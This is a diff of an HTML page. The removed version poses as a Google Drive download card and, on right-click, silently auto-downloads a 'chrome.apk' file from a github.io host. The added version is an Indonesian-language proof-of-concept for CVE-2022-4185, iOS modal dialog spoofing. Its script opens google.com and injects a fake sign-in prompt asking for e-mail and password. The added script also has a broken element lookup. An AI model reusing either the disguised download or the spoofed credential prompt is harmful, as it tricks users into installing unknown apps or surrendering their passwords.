@@ -1,38 +1,90 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Download Manager</title>
-<style>
-body{margin:0;padding:80px 20px;font-family:Arial;background:#f8f9fa;text-align:center}
-.card{max-width:500px;margin:0 auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
-h1{font-size:24px;color:#202124;margin:0 0 16px}
-p{color:#5f6368;margin:0 0 32px}
-.link{display:inline-block;padding:14px 32px;background:#1a73e8;color:#fff;text-decoration:none;border-radius:4px;font-size:16px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Asli - iOS Modal Dialog Spoofing (CVE-2022-4185)</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            padding: 20px;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 { color: #d9534f; margin-top: 0; }
+        .code-box {
+            background: #eee;
+            border: 1px solid #ccc;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .btn {
+            display: inline-block;
+            background: #0275d8;
+            color: white;
+            padding: 10px 20px;
+            text-decoration: none;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover { background: #025aa5; }
+    </style>
 </head>
 <body>
-<div class="card">
-  <h1>Google Drive Download</h1>
-  <p>Manage your downloads</p>
-  <a href="https://drive.google.com/drive/" id="link" class="link">
-    Right-click: Open in Split View
-  </a>
-</div>
-<script>
-document.getElementById('link').addEventListener('contextmenu', function() {
-  setTimeout(() => {
-    const downloadLink = document.createElement('a');
-    downloadLink.href = 'https://ecdnts-del.github.io/test-apk/chrome.apk';
-    downloadLink.style.display = 'none';
-    document.body.appendChild(downloadLink);
+
+<div class="container">
+    <h2>⚠️ Original PoC Test (CVE-2022-4185)</h2>
+    <p>Halaman ini menjalankan skrip PoC asli untuk menguji perilaku kemunculan kotak dialog modal JavaScript saat navigasi berpindah ke domain target.</p>
     
-    setTimeout(() => {
-      downloadLink.click();
-      setTimeout(() => document.body.removeChild(downloadLink), 1000);
-    }, 1200);
-  }, 500);
-});
+    <div class="code-box">
+        <strong>Payload Asli:</strong><br>
+        <code>&lt;script&gt;function y(){x=open('http://www.google.com','_top'),x.document.body.innerHTML='&lt;img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)"&gt;'};setTimeout(y, 3000);&lt;/script&gt;</code>
+    </div>
+
+    <p><strong>Instruksi Pengujian:</strong></p>
+    <ol>
+        <li>Klik tombol di bawah untuk memulai simulasi penundaan 3 detik.</li>
+        <li>Browser akan mengalihkan halaman ke <code>google.com</code> menggunakan referensi <code>_top</code>.</li>
+        <li>Amati respons dialog:</li>
+    </ol>
+
+    <button class="btn" onclick="runOriginalPoC()">Jalankan PoC Asli</button>
+
+    <div id="log" style="margin-top: 15px; font-size: 13px; color: #666;"></div>
+</div>
+
+<script>
+    // Memuat tepat kode PoC asli yang Anda berikan
+    function runOriginalPoC() {
+        document.getElementById('log.innerHTML').innerText = "[*] Timer 3 detik dimulai... Bersiap membuka target.";
+        
+        function y() {
+            try {
+                let x = open('https://www.google.com', '_top');
+                x.document.body.innerHTML = '<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)">';
+            } catch (e) {
+                console.error(e);
+            }
+        }
+        
+        setTimeout(y, 3000);
+    }
 </script>
+
 </body>
 </html>
